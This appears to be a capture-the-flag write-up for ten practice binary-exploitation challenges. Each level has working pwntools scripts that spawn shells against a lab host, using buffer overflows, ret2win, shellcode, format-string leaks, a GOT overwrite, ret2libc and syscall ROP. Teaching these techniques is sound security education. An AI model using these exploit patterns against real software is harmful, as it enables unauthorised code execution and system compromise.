## General methodology

For every binary the same recon pipeline was used before writing an exploit:

```bash
file ./pwnXXX                       # arch, PIE vs no-PIE, static vs dynamic
checksec --file=./pwnXXX            # RELRO / Canary / NX / PIE
nm ./pwnXXX                         # user functions (ret2win targets, e.g. admins_only)
strings ./pwnXXX | grep -iE '/bin/sh|system|flag'
objdump -d -M intel ./pwnXXX        # exact stack frame offsets (sub rsp, lea rbp-0xNN)
# + Ghidra decompiler for high-level logic
```

Two recurring details that matter throughout:

* **Finding the overflow offset.** Ghidra names a buffer `local_28` etc., but the *real* offset
  comes from the `objdump` disassembly: `sub rsp,0xNN` and the `lea rax,[rbp-0xNN]` that feeds the
  input function. Offset-to-saved-RIP = (distance from buffer to saved RBP) + 8.
* **`system("/bin/sh")` stack alignment.** glibc's `do_system` executes a `movaps` instruction that
  faults if `RSP` is not 16-byte aligned. When a `ret` into a function lands on a misaligned stack,
  prepend a bare `ret` gadget to the chain to re-align. This is why several chains below start with a
  `ret` gadget.

## pwn101 — Stack overflow overwriting a local variable

**Vulnerability:** classic `gets()` buffer overflow (CWE-242 / CWE-787). A guard variable sits above the buffer; corrupting it unlocks `system("/bin/sh")`.

Decompiled `main`:
```c
char local_48[60];
int  local_c = 0x539;
gets(local_48);                 // unbounded write into 60-byte buffer
if (local_c == 0x539) { exit(0x539); }   // guard
system("/bin/sh");              // reached only if guard changed
```

The buffer is `rbp-0x48`, the guard `rbp-0xc` → exactly **60 bytes** apart. `gets()` has no length
limit, so we write 60 bytes of filler and 4 more bytes to change `local_c` away from `0x539`.
We never touch the saved return address, so `main` falls straight into `system("/bin/sh")`.

**Exploit (`exploits/xpl101.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'
HOST, PORT = '10.49.142.195', 9001

io = remote(HOST, PORT)

# Stack layout:
#   char local_48[60]  @ rbp-0x48   (gets() target)
#   int  local_c       @ rbp-0xc    (guard, initialised to 0x539)
# Distance buffer -> guard = 0x48 - 0xc = 0x3c = 60 bytes.
# Overwrite the guard with anything != 0x539 to skip exit() and reach system("/bin/sh").
payload = b'A' * 60 + p32(0xdeadbeef)
io.sendline(payload)

# We now have a shell; grab the flag.
io.sendline(b'cat flag.txt; cat /flag.txt; id')
import time; time.sleep(1)
print(io.recv(timeout=3).decode(errors='replace'))
io.close()
```
**Flag:** `THM{7h4t's_4n_3zy_oveRflowwwww}`

## pwn102 — Overwriting two guard variables

**Vulnerability:** `scanf("%s", buf)` overflow (unbounded, same risk class as `gets`). Here **two**
check variables must be set to specific values.

```c
char local_78[104];
int  local_10 = 0xbadf00d;      // must become 0xc0d3  (rbp-0x10, offset 104)
int  local_c  = ...;            // must become 0xc0ff33 (rbp-0xc,  offset 108)
scanf("%s", local_78);
if (local_c == 0xc0ff33 && local_10 == 0xc0d3) system("/bin/sh");
```

The buffer is `rbp-0x78`; `local_10` is 104 bytes in, `local_c` 108 bytes in. We pad 104 bytes then
place the two required DWORDs in stack order. `scanf %s` stops only at whitespace (space/tab/newline),
so embedded **null bytes are fine** — important because `0xc0d3` = `\xd3\xc0\x00\x00`.

**Exploit (`exploits/xpl102.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

io = remote('10.49.142.195', 9002)

# Stack layout:
#   char local_78[104] @ rbp-0x78   (scanf("%s") target)
#   int  local_10      @ rbp-0x10   -> offset 104, must equal 0xc0d3
#   int  local_c       @ rbp-0xc    -> offset 108, must equal 0xc0ff33
# scanf("%s") stops only on whitespace, so embedded NUL bytes are fine.
payload = b'A' * 104 + p32(0xc0d3) + p32(0xc0ff33)
io.sendline(payload)

io.sendline(b'cat flag.txt; id')
import time; time.sleep(1)
print(io.recv(timeout=3).decode(errors='replace'))
io.close()
```
**Flag:** `THM{y3s_1_n33D_C0ff33_to_C0d3_<3}`

## pwn103 — ret2win

**Vulnerability:** stack overflow via `scanf("%s", buf)` in the "General" menu channel, redirecting
execution to a hidden win function `admins_only()` that calls `system("/bin/sh")`. No PIE, so the
address is fixed.

Flow: menu → option `3` (General) reads into `char buf[32]` at `rbp-0x20`. Offset to saved RIP =
32 + 8 = **40**. Win function `admins_only` is at `0x401554`.

Because `admins_only` eventually calls `system`, we prepend a `ret` (`0x401016`) gadget to keep the
stack 16-byte aligned.

**Exploit (`exploits/xpl103.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

io = remote('10.49.142.195', 9003)

ret         = 0x401016   # a bare `ret` gadget, used for 16-byte stack alignment
admins_only = 0x401554   # win function: puts(...); puts(...); system("/bin/sh")

# Navigate the menu to the vulnerable "General" channel (option 3),
# which reads into char buf[32] @ rbp-0x20 with scanf("%s").
# Offset to the saved return address = 32 (buffer->saved rbp) + 8 = 40.
io.recvuntil(b'channel:')
io.sendline(b'3')
io.recvuntil(b'[pwner]:')

io.sendline(b'A' * 40 + p64(ret) + p64(admins_only))

io.sendline(b'cat flag.txt; id')
import time; time.sleep(1.5)
print(io.recvrepeat(3).decode(errors='replace')[-300:])
io.close()
```
**Flag:** `THM{w3lC0m3_4Dm1N}`

## pwn104 — Shellcode on an executable stack

**Vulnerability:** NX is **disabled** (executable stack) and `main` leaks the buffer address:
```c
char local_58[80];
printf("I'm waiting for you at %p\n", local_58);  // stack address leak
read(0, local_58, 200);                            // 200 bytes into 80-byte buffer
```
200-byte read into an 80-byte buffer → overflow. The `%p` leak hands us the exact stack address of
the buffer, so ASLR is irrelevant. We put shellcode at the start of the buffer and overwrite the
saved return address with the leaked buffer address.

Buffer is `rbp-0x50` → offset to saved RIP = 80 + 8 = **88**.

**Exploit (`exploits/xpl104.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.clear(arch='amd64', os='linux')
context.log_level = 'error'

io = remote('10.49.142.195', 9004)

# main prints: "I'm waiting for you at 0x7fff...."  -> the buffer's stack address.
io.recvuntil(b'you at ')
leak = int(io.recvline().strip(), 16)
print('[+] buf leak =', hex(leak))

# NX is OFF, so the stack is executable. Put execve("/bin/sh") shellcode at the
# start of the buffer and redirect the saved return address back into it.
sc = asm(shellcraft.amd64.linux.sh())
print('[+] shellcode len =', len(sc))

# Buffer is char local[80] @ rbp-0x50 -> offset to saved RIP = 80 + 8 = 88.
payload = sc + b'A' * (88 - len(sc)) + p64(leak)
io.send(payload)

import time; time.sleep(1)
io.sendline(b'echo PWNED; cat flag.txt; id')
time.sleep(1.5)
print('[+] resp =', repr(io.recvrepeat(3)[-300:]))
io.close()
```
**Flag:** `THM{0h_n0o0o0o_h0w_Y0u_Won??}`

## pwn105 — Signed integer overflow (logic vulnerability)

**Vulnerability:** no memory corruption at all — a **signed integer overflow** (CWE-190) in an adder.

```c
scanf("%d", &a); scanf("%d", &b);
c = a + b;
if (a < 0 || b < 0)      puts("Good try");     // both inputs must be >= 0
else if ((int)c < 0)     system("/bin/sh");    // but their sum is negative?!
else                     printf("RESULT ...");
```

Two non-negative 32-bit integers whose sum exceeds `INT_MAX` (`0x7fffffff`) wrap around to a negative
value. `2000000000 + 2000000000 = 4000000000`, which as a signed 32-bit int is `-294967296` → the
shell branch fires.

**Exploit (`exploits/xpl105.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

io = remote('10.49.142.195', 9005)

# Both numbers must be >= 0, but their 32-bit signed sum must be < 0.
# 2000000000 + 2000000000 = 4000000000 -> wraps to -294967296 (int32).
io.recvuntil(b']>> ')
io.sendline(b'2000000000')
io.recvuntil(b']>> ')
io.sendline(b'2000000000')

import time; time.sleep(1)
io.sendline(b'cat flag.txt; id')
time.sleep(1.5)
print(io.recvrepeat(3).decode(errors='replace')[-300:])
io.close()
```
**Flag:** `THM{VerY_b4D_1n73G3rsss}`

## pwn106 — Format string information leak

**Vulnerability:** `printf(user_input)` with no format specifier (CWE-134). The flag is built on the
stack as an immediate and then our controlled format string is printed:

```c
char buf[0x40];             // at rbp-0x40
// flag placed on the stack at rbp-0x60 via movabs immediates
read(0, buf, 0x32);
printf(buf);                // <-- format string vuln
```

The flag lives at `rbp-0x60`, our format string at `rbp-0x40`. Using positional format specifiers
(`%N$p`) we read raw stack QWORDs; the flag begins at **stack argument position 6**. Decoding
consecutive `%6$p … %13$p` leaks and concatenating them (little-endian) reconstructs the flag.

**Exploit (`exploits/xpl106.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

io = remote('10.49.142.195', 9006)

# printf(user_input) with no format specifier. The flag sits on the stack
# starting at argument position 6. Leak 8 consecutive qwords with %N$p.
io.recvuntil(b'giveaway:')
io.sendline(b'.'.join([b'%%%d$p' % i for i in range(6, 14)]))

import time; time.sleep(1)
data = io.recvrepeat(2).decode(errors='replace')
io.close()

# Rebuild the flag: each leaked qword is 8 little-endian bytes of the string.
part = data.split('Thanks ')[-1]
flag = b''
for tok in part.split('.'):
    tok = tok.strip()
    if tok.startswith('0x'):
        try:
            flag += p64(int(tok, 16))
        except Exception:
            pass
flag = flag.split(b'\x00')[0]
print('raw :', repr(part))
print('FLAG:', flag.decode(errors='replace'))
```
**Flag:** `THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}`

## pwn107 — Format string leak defeating canary + PIE, then ROP

**Vulnerability:** two bugs chained. First a format string with limited input, then a large
overflow — but a stack canary and PIE protect the return path:

```c
char fmt[0x40];           // rbp-0x40, read of only 0x14 bytes
read(0, fmt, 0x14);
printf(fmt);              // (1) format string leak
char buf[0x18];           // rbp-0x20
read(0, buf, 0x200);      // (2) overflow: 512 bytes into 24-byte buffer
// canary check ...
```

**Step 1 — leak.** With a 20-byte budget we send `%13$p.%19$p`:
* `%13$p` → the **stack canary** (value ending in `00`).
* `%19$p` → a pointer equal to `PIE_base + 0x992` (`main`), so `PIE_base = leak - 0x992`.

**Step 2 — overflow.** `buf` (`rbp-0x20`) → canary (`rbp-0x8`) = **24 bytes**. We rebuild the stack:
`24 filler + canary + saved_rbp + ret_gadget + get_streak`. The win function `get_streak()`
(`PIE_base+0x94c`) calls `system("/bin/sh")`; a `ret` gadget (`PIE_base+0x6fe`) handles alignment.

Both leaks and the overflow happen in the **same connection** (canary and PIE base are per-process).

**Exploit (`exploits/xpl107.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'

io = remote('10.49.142.195', 9007)

# --- Step 1: format-string leak (input budget is only 0x14 = 20 bytes) ---
#   %13$p -> stack canary (ends in 00)
#   %19$p -> pointer equal to PIE_base + 0x992 (main)
io.recvuntil(b'last streak? ')
io.sendline(b'%13$p.%19$p')
io.recvuntil(b'current streak: ')
leaks  = io.recvline().strip().split(b'.')
canary = int(leaks[0], 16)
pie    = int(leaks[1], 16) - 0x992
print('[+] canary   =', hex(canary))
print('[+] PIE base =', hex(pie))

ret        = pie + 0x6fe   # bare `ret` gadget (stack alignment for system)
get_streak = pie + 0x94c   # win function: system("/bin/sh")

# --- Step 2: stack overflow (read 0x200 into char buf[0x18] @ rbp-0x20) ---
# buf -> canary (rbp-0x8) = 24 bytes. Rebuild: pad + canary + saved_rbp + ROP.
io.recvuntil(b'notification pops up]')
io.recvline()
payload = b'A' * 24 + p64(canary) + p64(0) + p64(ret) + p64(get_streak)
io.send(payload)

import time; time.sleep(1)
io.sendline(b'cat flag.txt; id')
time.sleep(1.5)
print(io.recvrepeat(3).decode(errors='replace')[-300:])
io.close()
```
**Flag:** `THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}`

## pwn108 — Format string write → GOT overwrite

**Vulnerability:** `printf(reg_no)` format string with a generous 100-byte buffer, giving an
arbitrary-write primitive via `%n`. Both `read()`s are bounded (no overflow), so the win comes from
the format string alone. No PIE + **Partial RELRO** means the GOT is at a fixed, writable address.

Target: redirect control to `holidays()` (`0x40123b`, calls `system("/bin/sh")`).

Choosing which GOT entry to hijack matters: `holidays()` itself calls `printf`, so overwriting
`printf@GOT` causes infinite recursion. We overwrite **`puts@GOT` (`0x404018`)** instead — the next
`puts()` call in `main` (printing the "Branch" line) jumps into `holidays()`.

Our format buffer sits at **argument position 10**, found by probing with `BBBBBBBB.%p.%p…` and
locating `0x4242424242424242`. `pwntools` builds the `%n` writes automatically.

**Exploit (`exploits/xpl108.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'

io = remote('10.49.142.195', 9008)

puts_got = 0x404018   # overwrite this (Partial RELRO -> GOT is writable)
holidays = 0x40123b   # ... with the win function that calls system("/bin/sh")

# The 2nd input (reg no) is passed straight to printf -> arbitrary write via %n.
# Our buffer is at format-argument position 10. pwntools builds the %n writes.
# NOTE: we hijack puts@GOT, not printf@GOT, because holidays() itself calls
# printf (hijacking printf would recurse infinitely). The next puts() in main
# then jumps into holidays().
payload = fmtstr_payload(10, {puts_got: holidays}, write_size='short')
assert len(payload) <= 100, len(payload)   # bounded 100-byte read

io.recvuntil(b'[Your name]:')
io.send(b'anon')
io.recvuntil(b'[Your Reg No]:')
io.send(payload)

import time; time.sleep(1)
io.sendline(b'cat flag.txt; id')
time.sleep(1.5)
print(io.recvrepeat(3).decode(errors='replace')[-300:])
io.close()
```
**Flag:** `THM{7urN3d_puts_in70_win}`

## pwn109 — ret2libc (leak libc, then call system)

**Vulnerability:** `gets(buf)` overflow with **no** `system`/`/bin/sh` in the (dynamically linked)
binary → classic **ret2libc**. No PIE, no canary.

```c
char buf[32];   // rbp-0x20  -> offset to RIP = 40
gets(buf);
```

**Step 1 — leak libc.** ROP `puts(puts@GOT)` to print the runtime address of `puts`, then return to
`main` to reuse the overflow:
```
pad(40) + pop_rdi; puts@got + puts@plt + main
```
Leaked `puts = 0x7f..420`, `gets = 0x7f..970`. Submitting the low 3 nibbles to the libc database
(`libc.rip`) uniquely identifies the remote libc as **`libc6_2.31-0ubuntu9.14_amd64`** (Ubuntu 20.04),
giving `system=0x52290`, `str_bin_sh=0x1b45bd`, `puts=0x84420`.

**Step 2 — ret2libc.** `libc_base = puts_leak - 0x84420`, then on the second `gets`:
```
pad(40) + ret + pop_rdi; binsh + system
```
(the leading `ret` re-aligns the stack for `system`'s `movaps`).

**Exploit (`exploits/xpl109.py`):** (single connection; leak → main → system)
```python
#!/usr/bin/env python3
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'

# Static addresses from the (no-PIE) binary.
pop_rdi  = 0x4012a3
ret      = 0x40101a
puts_plt = 0x401060
puts_got = 0x404018
main     = 0x4011f2

# Offsets from the identified remote libc: libc6_2.31-0ubuntu9.14_amd64
off_puts   = 0x84420
off_system = 0x52290
off_binsh  = 0x1b45bd

io = remote('10.49.142.195', 9009)

# --- Step 1: leak libc by printing puts' runtime address, then return to main ---
# Buffer char buf[32] @ rbp-0x20 -> offset to saved RIP = 40.
io.recvuntil(b'Go ahead'); io.recvline()
io.sendline(b'A' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

import time; time.sleep(1)
puts_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))   # keep every byte (low byte may be a space)
base = puts_leak - off_puts
log.warning(f'puts={hex(puts_leak)} base={hex(base)}')
system = base + off_system
binsh  = base + off_binsh

# --- Step 2: ret2libc system("/bin/sh") on the second gets() ---
# Leading `ret` re-aligns the stack for system()'s movaps.
io.recvuntil(b'Go ahead'); io.recvline()
io.sendline(b'A' * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))

time.sleep(1)
io.sendline(b'cat flag.txt; id')
time.sleep(1.5)
print(io.recvrepeat(3).decode(errors='replace')[-200:])
io.close()
```
**Flag:** `THM{w417_h0w_Y0u_l3ked_i7_w1th0uT_pr1ntF??}`

> Libc identification command:
> ```bash
> curl -s -X POST https://libc.rip/api/find -H 'Content-Type: application/json' \
>      -d '{"symbols":{"puts":"420","gets":"970"}}'
> ```

## pwn110 — Static binary: ROP `execve("/bin/sh")` via syscall

**Vulnerability:** same `gets(buf)` overflow (offset **40**), but the binary is **statically linked**
— there is no libc to leak and, notably, **no `/bin/sh` string anywhere** in the binary. We build the
shell entirely from ROP gadgets and the `execve` syscall, and we plant the string ourselves.

Gadgets harvested with `ROPgadget`/pwntools:
```
pop rdi;ret 0x40191a   pop rsi;ret 0x40f4de   pop rdx;ret 0x40181f
pop rax;ret 0x4497d7   syscall;ret 0x4173d4   ret 0x40101a   gets 0x411a10
```

**Plan (one overflow, two input lines):**
1. ROP `gets(bss)` to read `"/bin/sh"` from stdin into a writable `.bss` address.
2. Fall through into `execve(bss, 0, 0)`: set `rdi=bss`, `rsi=0`, `rdx=0`, `rax=59`, `syscall`.

```
pad(40)
+ pop_rdi; bss + gets                 # gets(bss)  <- "/bin/sh"
+ pop_rdi; bss
+ pop_rsi; 0
+ pop_rdx; 0
+ pop_rax; 59
+ ret + syscall                       # execve("/bin/sh", NULL, NULL)
```
The second line sent to the program (`/bin/sh`) is what `gets(bss)` consumes.

> Note: `checksec` reports SHSTK/IBT (Intel CET) marked in the ELF, but the THM target does not
> enforce CET at runtime, so plain `ret`/`syscall` gadget chains work.

**Exploit (`exploits/xpl110.py`):**
```python
#!/usr/bin/env python3
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'

# Gadgets / symbols from the static binary.
pop_rdi = 0x40191a
pop_rsi = 0x40f4de
pop_rdx = 0x40181f
pop_rax = 0x4497d7
syscall = 0x4173d4
ret     = 0x40101a
gets    = 0x411a10
bss     = 0x4c2240 + 0x200   # a quiet writable .bss address to hold "/bin/sh"

io = remote('10.49.142.195', 9010)
io.recvuntil(b'without libc')
io.recvline()

# Buffer char buf[32] @ rbp-0x20 -> offset to saved RIP = 40.
# Stage 1: gets(bss) reads "/bin/sh" from stdin into .bss.
# Stage 2: fall through into execve(bss, 0, 0) via syscall (rax=59).
chain  = b'A' * 40
chain += p64(pop_rdi) + p64(bss) + p64(gets)          # gets(bss)
chain += p64(pop_rdi) + p64(bss)                      # rdi = "/bin/sh"
chain += p64(pop_rsi) + p64(0)                        # rsi = NULL (argv)
chain += p64(pop_rdx) + p64(0)                        # rdx = NULL (envp)
chain += p64(pop_rax) + p64(59)                       # rax = 59 (execve)
chain += p64(ret) + p64(syscall)                      # aligned syscall
io.sendline(chain)

import time; time.sleep(0.6)
io.sendline(b'/bin/sh')              # this line is what gets(bss) consumes
time.sleep(1)
io.sendline(b'echo PWNED; cat flag.txt; id')
time.sleep(1.5)
print('RESP:', repr(io.recvrepeat(3)[-200:]))
io.close()
```
**Flag:** `THM{n1c3_us3_0f_g4dg37s}`

## Key takeaways

* **Mitigations stack up:** each level removes one crutch — NX forces ret2libc/ROP instead of
  shellcode, a canary forces an info leak, PIE forces a second leak, static linking removes libc and
  forces pure-syscall ROP.
* **An info leak defeats both canary and ASLR/PIE** (pwn104, pwn107, pwn109) — a single `%p` or a
  `puts(GOT)` ROP is usually all that stands between you and a reliable exploit.
* **Partial RELRO = writable GOT**, which turns any arbitrary-write primitive (format string `%n`)
  into code execution (pwn108).
* **Always confirm offsets from the disassembly**, not the decompiler's variable names — Ghidra's
  `local_58` was really `rbp-0x50` in pwn104, and the wrong guess silently fails.
* **Remember `movaps` alignment** for `system()`/`do_system` — a stray `ret` gadget fixes the classic
  "crashes right as the shell should spawn" symptom.

All exploit scripts are in `./exploits/` and run with `python3 exploits/xplNNN.py` (requires
`pwntools`).
